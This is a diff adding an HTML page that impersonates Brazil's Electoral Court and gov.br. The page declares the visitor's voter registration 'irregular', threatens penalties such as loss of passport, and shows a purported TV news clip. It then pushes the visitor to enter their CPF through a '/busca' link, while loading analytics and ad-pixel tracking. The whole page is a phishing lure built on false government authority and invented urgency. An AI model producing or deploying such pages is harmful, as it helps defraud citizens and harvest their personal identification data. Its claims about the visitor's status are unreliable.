@@ -1,0 +1,403 @@
+<!DOCTYPE html>
+<html data-template="verificar-cpf">
+<head>
+    <script type="text/javascript">
+        (function(c,l,a,r,i,t,y){
+            c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+            t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+            y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+        })(window, document, "clarity", "script", "ttuhjmpt6a");
+    </script>
+    <meta charset="utf-8"/>
+    <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+    <title>Justiça Eleitoral - Verificar Situação Eleitoral</title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @font-face {
+            font-family: 'Rawline';
+            src: url("/static/fonts/rawline-400.ea42a37247439622.woff2") format('woff2');
+            font-weight: 400;
+            font-style: normal;
+        }
+        @font-face {
+            font-family: 'Rawline';
+            src: url("/static/fonts/rawline-600.844a17f0db94d147.woff2") format('woff2');
+            font-weight: 600;
+            font-style: normal;
+        }
+        @font-face {
+            font-family: 'Rawline';
+            src: url("/static/fonts/rawline-700.1c7c76152b40409f.woff2") format('woff2');
+            font-weight: 700;
+            font-style: normal;
+        }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Rawline', sans-serif;
+        }
+        body {
+            background-color: white;
+            padding-top: 64px;
+            color: #333333;
+            font-size: 16px;
+            line-height: 1.05;
+        }
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 8px 20px;
+            background-color: #ffffff;
+            border-bottom: 1px solid #e0e0e0;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            z-index: 1000;
+            box-shadow: 0 1px 4px rgba(0,0,0,0.08);
+            height: 75px;
+        }
+        .header-logos {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            flex-shrink: 0;
+        }
+
+        .header-logos .divider {
+            width: 1px;
+            height: 45px;
+            background-color: #d0d0d0;
+        }
+
+        .logo {
+            height: 55px;
+            width: auto;
+        }
+
+        .header-logos .govbr-logo {
+            height: 55px;
+            width: auto;
+        }
+        .header-title-section {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            flex: 1;
+            text-align: center;
+            padding: 0 15px;
+        }
+        .header-title-section h1 {
+            font-size: 14px;
+            font-weight: 700;
+            color: #1B3A6B;
+            margin: 0;
+            letter-spacing: 0.5px;
+        }
+        .header-title-section p {
+            font-size: 11px;
+            color: #666;
+            margin: 0;
+        }
+        .header-icons {
+            display: flex;
+            gap: 15px;
+            flex-shrink: 0;
+        }
+        .header-icon {
+            font-size: 18px;
+            color: #1B3A6B;
+        }
+        .hero-banner {
+            width: 100%;
+            background: linear-gradient(135deg, #1B3A6B 0%, #0f2a50 50%, #1B3A6B 100%);
+            padding: 20px 15px;
+            text-align: center;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.2);
+        }
+        .hero-banner h2 {
+            color: #FFD700;
+            font-size: 18px;
+            font-weight: 800;
+            text-transform: uppercase;
+            margin-bottom: 8px;
+        }
+        .hero-banner p {
+            color: white;
+            font-size: 13px;
+            font-weight: 600;
+            line-height: 1.4;
+        }
+        .user-info {
+            display: flex;
+            flex-direction: column;
+            position: relative;
+            margin: 15px;
+            box-shadow: 0 1px 6px rgba(0, 0, 0, 0.2);
+            background-color: white;
+            padding: 15px;
+            border-radius: 4px;
+            width: calc(100% - 30px);
+        }
+        .user-info-content {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-start;
+            width: 100%;
+        }
+        .user-info p {
+            margin: 1px 0;
+            color: #333333;
+            font-size: 16px;
+        }
+        .user-info p strong {
+            font-weight: 600;
+        }
+        .user-info h3 {
+            font-weight: 700;
+            color: #1B3A6B;
+            margin-bottom: 4px;
+        }
+        .video-container {
+            position: relative;
+            width: 100%;
+            margin: 8px auto 0;
+            border-radius: 4px;
+            overflow: hidden;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+        .news-video {
+            width: 100%;
+            display: block;
+        }
+        .sound-button {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: rgba(220, 53, 69, 0.9);
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 8px;
+            cursor: pointer;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 8px;
+            animation: pulse 1s infinite ease-in-out;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.2);
+        }
+        .news-description {
+            color: #333;
+            margin-top: 12px;
+            padding: 0 4px;
+            text-align: justify;
+            width: 100%;
+        }
+        .verify-cpf-button {
+            width: 100%;
+            padding: 12px;
+            background-color: #1B3A6B;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-weight: 600;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            margin-top: 20px;
+        }
+        .verify-cpf-button:hover {
+            background-color: #0f2a50;
+        }
+        .footer {
+            background: linear-gradient(180deg, #1B3A6B 0%, #142d54 100%);
+            border-top: 3px solid #C4A84D;
+            color: white;
+            padding: 16px;
+            text-align: center;
+            margin-top: 40px;
+            width: 100%;
+            position: relative;
+            bottom: 0;
+        }
+        .footer-logos {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
+            margin-bottom: 10px;
+        }
+
+        .footer-logos .divider {
+            width: 1px;
+            height: 30px;
+            background-color: rgba(255,255,255,0.3);
+        }
+
+        .footer-logo {
+            width: 80px;
+            height: auto;
+        }
+
+        .footer-logos .govbr-logo {
+            height: 22px;
+            width: auto;
+        }
+        @keyframes pulse {
+            0% { transform: translate(-50%, -50%) scale(1); }
+            50% { transform: translate(-50%, -50%) scale(1.1); }
+            100% { transform: translate(-50%, -50%) scale(1); }
+        }
+        @keyframes pulseAlert {
+            0% { transform: scale(1); opacity: 1; }
+            50% { transform: scale(1.25); opacity: 0.7; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+        @media (max-width: 600px) {
+            .header {
+                padding: 6px 8px;
+            }
+            .logo {
+                height: 38px;
+                width: auto;
+            }
+            .header-logos .govbr-logo {
+                height: 38px;
+            }
+            .header-logos .divider {
+                height: 30px;
+            }
+            .header-logos {
+                gap: 8px;
+            }
+            .header-title-section h1 {
+                font-size: 11px;
+            }
+            .header-title-section p {
+                font-size: 9px;
+            }
+            .header-title-section {
+                padding: 0 8px;
+            }
+            .header-icons {
+                gap: 8px;
+            }
+            .header-icon {
+                font-size: 16px;
+            }
+            .user-info {
+                margin: 10px;
+                width: calc(100% - 20px);
+            }
+        }
+    </style>
+<meta name="tiktok-developers-site-verification" content="cgRf1iQLMvO9KfzUrJPDKfsAbQ2ypE17" />
+  <script src="/static/js/pixel-loader.js"></script>
+</head>
+<body class="verificar-cpf-page">
+    <div class="header">
+        <div class="header-logos">
+            <img src="/static/images/logo-portal.webp" alt="Gov.br" class="govbr-logo">
+            <div class="divider"></div>
+            <img alt="Logo TSE" class="logo" src="/static/images/logo-sistema.png"/>
+        </div>
+        <div class="header-title-section">
+            <h1>Justiça Eleitoral do Brasil</h1>
+        </div>
+        <div class="header-icons">
+            <i class="fas fa-search header-icon"></i>
+            <i class="fas fa-question-circle header-icon"></i>
+            <i class="fas fa-adjust header-icon"></i>
+        </div>
+    </div>
+
+    <div class="hero-banner">
+        <i class="fas fa-exclamation-triangle" style="font-size: 28px; color: #C4A84D; margin-bottom: 8px; display: inline-block; animation: pulseAlert 1.5s ease-in-out infinite;"></i>
+        <h2>TÍTULO DE ELEITOR IRREGULAR</h2>
+        <p>Conforme o Código Eleitoral (Lei nº 4.737/65), o voto é obrigatório. Verifique sua situação eleitoral.</p>
+    </div>
+
+    <div class="user-info">
+        <div class="user-info-content">
+            <div class="user-info-text">
+                <h3>Notícia na mídia</h3>
+                <p><strong>Programa:</strong> Jornal da Band</p>
+                <p><strong>Data:</strong> 05 de março de 2025</p>
+            </div>
+        </div>
+        <div class="video-container" data-debug="video-container">
+            <video id="newsVideo" class="news-video" autoplay muted playsinline webkit-playsinline data-debug="news-video">
+                <source src="/static/videos/news.mp4" type="video/mp4">
+                Seu navegador não suporta o elemento de vídeo.
+            </video>
+            <button id="soundButton" class="sound-button" data-debug="sound-button">
+                <i class="fas fa-volume-up"></i>
+                <span>CLIQUE PARA OUVIR!</span>
+            </button>
+        </div>
+        <p class="news-description">
+            De acordo com a Justiça Eleitoral, eleitores com título irregular ou cancelado estão sujeitos a diversas restrições civis, 
+            incluindo impossibilidade de obter passaporte, tomar posse em cargo público e realizar financiamentos em bancos públicos. 
+            O voto é obrigatório conforme a Constituição Federal. Para verificar se seu título está regular e evitar penalidades, 
+            insira seu CPF abaixo.
+        </p>
+        <button onclick="window.location.href='/busca'" class="verify-cpf-button">
+            Verificar minha situação eleitoral
+        </button>
+    </div>
+
+    <footer class="footer">
+        <div class="footer-logos">
+            <img src="/static/images/logo-portal.webp" alt="Gov.br" class="govbr-logo">
+            <div class="divider"></div>
+            <img src="/static/images/logo-sistema.png" alt="TSE Logo" class="footer-logo">
+        </div>
+        <p>Tribunal Superior Eleitoral - Justiça Eleitoral do Brasil</p>
+        <p style="font-size: 11px; opacity: 0.7; margin-top: 4px;">O voto é obrigatório. Regularize sua situação eleitoral.</p>
+    </footer>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const video = document.getElementById('newsVideo');
+            const soundButton = document.getElementById('soundButton');
+
+            if (!video || !soundButton) return;
+
+            video.muted = true;
+            soundButton.style.display = 'flex';
+
+            video.addEventListener('click', function(e) {
+                e.preventDefault();
+                if (video.paused) {
+                    video.play();
+                } else {
+                    video.pause();
+                }
+                soundButton.style.display = 'flex';
+            });
+
+            soundButton.addEventListener('click', function(e) {
+                e.preventDefault();
+                video.currentTime = 0;
+                video.muted = false;
+                video.play();
+                soundButton.style.display = 'none';
+            });
+
+            video.addEventListener('ended', function() {
+                video.currentTime = 0;
+                video.pause();
+                video.muted = true;
+                soundButton.style.display = 'flex';
+            });
+
+            video.currentTime = 0;
+        });
+    </script>
+</body>
+</html>
